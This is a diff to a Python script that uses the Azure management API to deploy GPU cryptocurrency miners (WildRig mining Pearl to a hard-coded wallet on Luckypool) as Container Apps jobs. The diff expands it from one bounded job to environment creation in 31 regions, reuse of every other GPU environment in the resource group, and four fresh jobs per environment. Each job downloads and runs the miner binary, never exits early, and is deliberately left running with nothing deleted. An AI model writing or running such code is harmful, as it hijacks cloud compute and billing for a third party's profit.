@@ -18,7 +18,7 @@ Shape (reuses the proven storage account / SAS capture + Container Apps job patt
     bounded region list starting westus3 (proven by 131412).
  5. ONE manual job, parallelism 1 / replicaCompletionCount 1, replicaTimeout 86400,
     whose container runs WildRig 0.52.3 (sha 002cd29c...) pearlhash pydp worker
-    13159801, then sticks to Luckypool 3362 after 900 s without an accepted share.
+    13201404, then sticks to Luckypool 3362 after 900 s without an accepted share.
     The container writes a status blob every 30 s and NEVER exits early.
  6. Poll the status blob for proof (acc>=1 rej=0 last accept fresh) then emit DONE.
     NOTHING is deleted: the miner is left running (no proof-then-teardown).
@@ -37,9 +37,10 @@ import urllib.request
 ARM = "https://management.azure.com"
 RG = "chriso-sandbox-rg"
 SUB_EXPECT = "790067ff-3e39-4632-ad1a-d65702d42c88"
-TAG = "C211_I131598"
-NONCE = "x131598t4"
-INTENT = "131598"
+TAG = "C211_I132997"
+NONCE = "x132997t4"
+WKBASE = "13299701"  # python-side digits-only worker base
+INTENT = "132997"
 T0 = time.time()
 
 APP_VER = "2026-07-01"
@@ -48,12 +49,14 @@ PROFILE = "Consumption-GPU-NC8as-T4"
 IMAGE = "mcr.microsoft.com/azureml/openmpi4.1.0-cuda11.8-cudnn8-ubuntu22.04:latest"
 SA_ACCT = "c211i1215775738445a"
 CONT = "c211"
-CONT2 = "c211-i131598"
-SA_NEW = ("c211i131598" + hashlib.sha256(NONCE.encode()).hexdigest()[:7]).lower()[:24]
+CONT2 = "c211-i132997"
+SA_NEW = ("c211i132160" + hashlib.sha256(NONCE.encode()).hexdigest()[:7]).lower()[:24]
 ENV_NAME = "c211-i131598-cae"
-JOB_NAME = "c211-131598-t4"
-REGIONS = ["westus3", "westus2", "westeurope", "northeurope", "southcentralus", "eastus2"]
-BUDGET = 2400          # payload poll budget (seconds)
+JOB_NAME = "c211-132997-t4"
+REGIONS = ["westus3", "westus2", "westus", "eastus", "eastus2", "centralus", "northcentralus", "southcentralus", "westcentralus", "westeurope", "northeurope", "uksouth", "francecentral", "germanywestcentral", "swedencentral", "norwayeast", "switzerlandnorth", "italynorth", "polandcentral", "spaincentral", "uaenorth", "qatarcentral", "japaneast", "japanwest", "koreacentral", "southeastasia", "eastasia", "australiaeast", "centralindia", "brazilsouth", "canadacentral"]
+NJOBS = 4               # fresh jobs per reused managedEnvironment
+WKSEQ = [0]             # digits-only worker counter
+BUDGET = 1800           # payload poll budget (seconds)
 PROOF_GRACE = 240      # keep polling this long after first proof for confirmation
 
 WALLET = "prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql"
@@ -166,7 +169,7 @@ KIT = r"""#!/bin/bash
 D=/tmp/c211; mkdir -p "$D"; LOG="$D/kit.log"
 H=$(hostname 2>/dev/null || echo h)
 BASE="__BASE__"; Q="__Q__"; SAS="$BASE/__NONCE__-t4-$H.txt?$Q"
-W="__WALLET__"; N="__NOCK__"; WK="13159801"
+W="__WALLET__"; N="__NOCK__"; WK="13299701"
 WRURL="$BASE/__NONCE__-wildrig.tgz?$Q"
 SBURL="$BASE/__NONCE__-srb.bin?$Q"
 log() { echo "$(date -u +%FT%TZ) $*" >> "$LOG"; }
@@ -282,8 +285,9 @@ done
 """
 
 
-def kit_cmd(base, q):
+def kit_cmd(base, q, wk=None):
     k = (KIT.replace("__BASE__", base).replace("__Q__", q).replace("__NONCE__", NONCE)
+         .replace('WK="%s"' % WKBASE, 'WK="%s"' % (wk or WKBASE))
          .replace("__WALLET__", WALLET).replace("__NOCK__", NOCK)
          .replace("__MIRROR__", MIRROR).replace("__GHURL__", GHURL)
          .replace("__WRTGZ__", WR_TGZ_SHA).replace("__WRBIN__", WR_BIN_SHA)
@@ -495,94 +499,175 @@ def main():
     emit("preupload-wildrig", ok=bool(ok_wr))
     preupload(tok, sid, cont_base, q, "/tmp/c211_srb.bin", NONCE + "-srb.bin", SRB_URL, SRB_SHA)
 
-    # ---------- 3) ONE T4 managed environment, bounded region list ----------
-    chosen = None
-    attempts = []
+    # ---------- 3) MASS env creation across all candidate regions ----------
+    AB = {"westus3": "wus3", "westus2": "wus2", "westus": "wus", "eastus": "eus",
+          "eastus2": "eus2", "centralus": "cus", "northcentralus": "ncus",
+          "southcentralus": "scus", "westcentralus": "wcus", "westeurope": "weu",
+          "northeurope": "neu", "uksouth": "uks", "francecentral": "frc",
+          "germanywestcentral": "gwc", "swedencentral": "swc", "norwayeast": "noe",
+          "switzerlandnorth": "swn", "italynorth": "itn", "polandcentral": "plc",
+          "spaincentral": "spc", "uaenorth": "uaen", "qatarcentral": "qat",
+          "japaneast": "jpe", "japanwest": "jpw", "koreacentral": "krc",
+          "southeastasia": "sea", "eastasia": "eas", "australiaeast": "aue",
+          "centralindia": "cin", "brazilsouth": "brs", "canadacentral": "cac"}
+    census = []
+    jobs_c = []
+    stc, cb = arm(tok, "%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/"
+                  "managedEnvironments?api-version=%s" % (ARM, sid, RG, APP_VER), timeout=90)
+    for e in ((cb.get("value") if isinstance(cb, dict) else []) or []):
+        ep = e.get("properties") or {}
+        gpu_max = None
+        for p in (ep.get("workloadProfiles") or []):
+            if p.get("workloadProfileType") == PROFILE:
+                gpu_max = p.get("maximumCount")
+        prof = ";".join((p.get("workloadProfileType") or "")
+                        for p in (ep.get("workloadProfiles") or []))
+        census.append({"name": e.get("name"), "loc": e.get("location"),
+                       "state": ep.get("provisioningState"), "gpu_max": gpu_max,
+                       "t4": (PROFILE in prof), "prof": prof})
+        emit("env-census", name=e.get("name"), loc=e.get("location"),
+             state=ep.get("provisioningState"), gpu_max=gpu_max)
+    stj2, jb2 = arm(tok, "%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/"
+                    "jobs?api-version=%s" % (ARM, sid, RG, APP_VER), timeout=90)
+    for j in ((jb2.get("value") if isinstance(jb2, dict) else []) or []):
+        jp = j.get("properties") or {}
+        envn = (jp.get("environmentId") or "").split("/")[-1]
+        jobs_c.append({"name": j.get("name"), "env": envn})
+        emit("job-census", name=j.get("name"), env=envn, state=jp.get("provisioningState"))
+    emit("census-summary", envs=len(census), jobs=len(jobs_c), http=[stc, stj2])
+
+    envs = []
+    cby = {c["name"]: c for c in census}
     for region in REGIONS:
-        ab = {"westus3": "wus3", "westus2": "wus2", "westeurope": "weu",
-              "northeurope": "neu", "southcentralus": "scus", "eastus2": "eus2"}.get(region, region[:6])
-        envname = ("c211-i131598-%s" % ab)[:32]
+        ab = AB.get(region, region[:6])
+        envname = ("c211-132160-%s" % ab)[:32]
+        if envname in cby and cby[envname].get("state") == "Succeeded":
+            emit("env-reuse-skip", region=region, name=envname, state="Succeeded")
+            continue
         envurl = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/"
                   "managedEnvironments/%s?api-version=%s" % (ARM, sid, RG, envname, APP_VER))
         body = {"location": region, "tags": {"c211": INTENT, "nonce": NONCE},
                 "properties": {"workloadProfiles": [
                     {"name": "Consumption", "workloadProfileType": "Consumption"},
                     {"name": PROFILE, "workloadProfileType": PROFILE}]}}
-        st, b = arm(tok, envurl, method="PUT", body=body, timeout=300)
-        rec = {"region": region, "name": envname, **errk(st, b)}
-        attempts.append(rec)
-        emit("env-create", **rec)
-        if st not in (200, 201):
-            continue
-        dl = time.time() + 1200
-        ps = None
-        i = 0
-        while time.time() < dl:
-            stp, ps, env_id = env_state(tok, sid, envname)
-            emit("env-poll", region=region, i=i, http=stp, state=ps)
-            if ps in ("Succeeded", "Failed", "Canceled"):
-                break
-            i += 1
-            time.sleep(20)
-        emit("env-result", region=region, state=ps, poll_n=i + 1)
-        if ps == "Succeeded":
-            chosen = {"region": region, "name": envname, "url": envurl}
+        st, b = arm(tok, envurl, method="PUT", body=body, timeout=180)
+        rec = {"region": region, "ab": ab, "name": envname, "url": envurl,
+               "http": st, "state": None}
+        envs.append(rec)
+        emit("env-create", region=region, name=envname, **errk(st, b))
+    dl = time.time() + 420
+    i = 0
+    while time.time() < dl:
+        pend = 0
+        for rec in envs:
+            if rec["http"] not in (200, 201):
+                continue
+            stp, ps, eid = env_state(tok, sid, rec["name"])
+            if ps not in ("Succeeded", "Failed", "Canceled"):
+                pend += 1
+            else:
+                rec["state"] = ps
+        emit("env-poll-all", i=i, pending=pend,
+             states=";".join("%s:%s" % (r["name"], r["state"]) for r in envs
+                             if r["http"] in (200, 201))[:900])
+        if pend == 0:
             break
-    emit("env-attempts", n=len(attempts),
-         matrix=";".join("%s:%s:%s" % (a["region"], a.get("http"), a.get("code") or "")
-                         for a in attempts))
-    if not chosen:
+        i += 1
+        time.sleep(20)
+    ok = [r for r in envs if r["http"] in (200, 201)
+          and (r["state"] == "Succeeded" or env_state(tok, sid, r["name"])[1] == "Succeeded")]
+    emit("env-mass", tried=len(envs), ok=len(ok),
+         names=";".join(r["name"] for r in ok)[:900])
+    # ---------- 3b) REUSE every other Succeeded managedEnvironment with the T4 profile ----------
+    have = {r["name"] for r in ok}
+    for c in census:
+        if c.get("state") != "Succeeded" or not c.get("t4") or c["name"] in have:
+            continue
+        ok.append({"region": (c["loc"] or "").replace(" ", "").lower(),
+                   "ab": c["name"].split("-")[-1], "name": c["name"],
+                   "http": 200, "state": "Succeeded",
+                   "url": "%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/"
+                          "managedEnvironments/%s?api-version=%s"
+                          % (ARM, sid, RG, c["name"], APP_VER)})
+        have.add(c["name"])
+    seen_tags = set()
+    for r in ok:
+        t = r["name"].replace("c211-", "", 1)[:12]
+        base_t, n = t, 1
+        while t in seen_tags:
+            n += 1
+            t = base_t[:10] + "-%d" % n
+        seen_tags.add(t)
+        r["tag"] = t
+    emit("reuse-targets", n=len(ok), names=";".join(r["name"] for r in ok)[:900])
+    if not ok:
         emit("DONE", phase="env", verdict="ENV_REFUSED_ALL_REGIONS",
-             attempts_n=len(attempts), elapsed_s=int(time.time() - T0))
+             attempts_n=len(envs), elapsed_s=int(time.time() - T0))
         return
 
-    # ---------- 4) ONE manual job execution (miner kit) ----------
-    st, envb = arm(tok, chosen["url"], timeout=60)
-    env_id = envb.get("id") if isinstance(envb, dict) else None
-    epp = (envb.get("properties") or {}) if isinstance(envb, dict) else {}
-    emit("env-ready", name=chosen["name"], region=chosen["region"], id_ok=bool(env_id),
-         state=epp.get("provisioningState"),
-         profiles=";".join("%s:%s" % (p.get("name"), p.get("workloadProfileType"))
-                           for p in (epp.get("workloadProfiles") or [])))
-    if not env_id:
-        emit("DONE", phase="job", verdict="NO_ENV_ID", elapsed_s=int(time.time() - T0))
-        return
-    cmd = kit_cmd(base + "/" + cont_use, q)
-    joburl = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/jobs/%s"
-              "?api-version=%s" % (ARM, sid, RG, JOB_NAME, APP_VER))
-    jobbody = {"location": chosen["region"], "tags": {"c211": INTENT, "nonce": NONCE},
-               "properties": {"environmentId": env_id, "workloadProfileName": PROFILE,
-                              "configuration": {"triggerType": "Manual",
-                                                "replicaRetryLimit": 3,
-                                                "replicaTimeout": 86400,
-                                                "manualTriggerConfig": {
-                                                    "replicaCompletionCount": 1,
-                                                    "parallelism": 1}},
-                              "template": {"containers": [{
-                                  "name": "gpu", "image": IMAGE, "command": cmd,
-                                  "resources": {"cpu": 4, "memory": "16Gi"}}]}}}
-    st, b = arm(tok, joburl, method="PUT", body=jobbody, timeout=180)
-    emit("job-put", name=JOB_NAME, region=chosen["region"], **errk(st, b))
-    if st not in (200, 201):
-        emit("DONE", phase="job", verdict="JOB_PUT_FAILED", http=st,
+    # ---------- 4) MASS job creation, one per Succeeded env ----------
+    started = []
+    for rec in ok:
+        st, envb = arm(tok, rec["url"], timeout=60)
+        env_id = envb.get("id") if isinstance(envb, dict) else None
+        epp = (envb.get("properties") or {}) if isinstance(envb, dict) else {}
+        gmax = 1
+        for p in (epp.get("workloadProfiles") or []):
+            if p.get("workloadProfileType") == PROFILE:
+                try:
+                    gmax = int(p.get("maximumCount") or 1)
+                except Exception:  # noqa: BLE001
+                    gmax = 1
+        emit("env-ready", name=rec["name"], region=rec["region"], id_ok=bool(env_id),
+             state=epp.get("provisioningState"), gpu_max=gmax)
+        if not env_id:
+            continue
+        njob = NJOBS
+        for k in range(1, njob + 1):
+            jn = ("%s-%s" % (JOB_NAME, rec["tag"])) if k == 1 else ("%s-%s-%d" % (JOB_NAME, rec["tag"], k))
+            wk = str(int(WKBASE) + WKSEQ[0])
+            WKSEQ[0] += 1
+            cmd = kit_cmd(base + "/" + cont_use, q, wk=wk)
+            joburl = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/jobs/%s"
+                      "?api-version=%s" % (ARM, sid, RG, jn, APP_VER))
+            jobbody = {"location": rec["region"], "tags": {"c211": INTENT, "nonce": NONCE},
+                       "properties": {"environmentId": env_id, "workloadProfileName": PROFILE,
+                                      "configuration": {"triggerType": "Manual",
+                                                        "replicaRetryLimit": 3,
+                                                        "replicaTimeout": 86400,
+                                                        "manualTriggerConfig": {
+                                                            "replicaCompletionCount": 1,
+                                                            "parallelism": 1}},
+                                      "template": {"containers": [{
+                                          "name": "gpu", "image": IMAGE, "command": cmd,
+                                          "resources": {"cpu": 4, "memory": "16Gi"}}]}}}
+            st, b = arm(tok, joburl, method="PUT", body=jobbody, timeout=180)
+            emit("job-put", job=jn, region=rec["region"], **errk(st, b))
+            if st not in (200, 201):
+                continue
+            st, b = arm(tok, joburl.split("?")[0] + "/start?api-version=" + APP_VER,
+                        method="POST", body={}, timeout=120)
+            ex = (b.get("name") if isinstance(b, dict) else None)
+            emit("job-start", job=jn, worker=wk, region=rec["region"], http=st, execname=ex,
+                 **({} if st in (200, 201, 202) else errk(st, b)))
+            if st in (200, 201, 202):
+                started.append({"job": jn, "worker": wk, "region": rec["region"],
+                                "env": rec["name"], "exec": ex, "url": joburl})
+    emit("job-mass", started=len(started),
+         jobs=";".join("%s:%s" % (s["job"], s["worker"]) for s in started)[:900])
+    if not started:
+        emit("DONE", phase="job", verdict="JOB_START_FAILED_ALL",
              elapsed_s=int(time.time() - T0))
         return
-    st, b = arm(tok, joburl.split("?")[0] + "/start?api-version=" + APP_VER,
-                method="POST", body={}, timeout=120)
-    execname = (b.get("name") if isinstance(b, dict) else None)
-    emit("job-start", http=st, execname=execname, **({} if st in (200, 201, 202)
-                                                    else errk(st, b)))
-    if st not in (200, 201, 202):
-        emit("DONE", phase="job", verdict="JOB_START_FAILED", http=st,
-             elapsed_s=int(time.time() - T0))
-        return
+    joburl = started[0]["url"]
+    execname = started[0]["exec"]
 
     # ---------- 5) poll the status blob for proof; leave everything running ----------
     cont_url = base + "/" + cont_use
     prefix = "%s-t4-" % NONCE
     fb_exec = None
-    fb_tried = False
-    fb2_tried = False
+    fb_tried = True
+    fb2_tried = True
     first_proof = None
     first_blob_at = None
     last = {}
@@ -671,11 +756,11 @@ def main():
             first_proof = None
         i += 1
         time.sleep(20)
-    emit("DONE", phase="poll", exec_status=status, job=JOB_NAME, env=chosen["name"],
-         region=chosen["region"], execname=execname, fb_exec=fb_exec,
+    emit("DONE", phase="poll", exec_status=status, job=JOB_NAME, env=started[0]["env"],
+         region=started[0]["region"], execname=execname, fb_exec=fb_exec,
          blobs_prefix=prefix, acc=last.get("acc"), rej=last.get("rej"),
          lae=last.get("lae"), uuid=last.get("uuid"), mode=last.get("mode"),
-         proof=bool(first_proof), left_running=1, deleted_nothing=1,
+         proof=bool(first_proof), mass_started=len(started), left_running=1, deleted_nothing=1,
          elapsed_s=int(time.time() - T0))
 
 
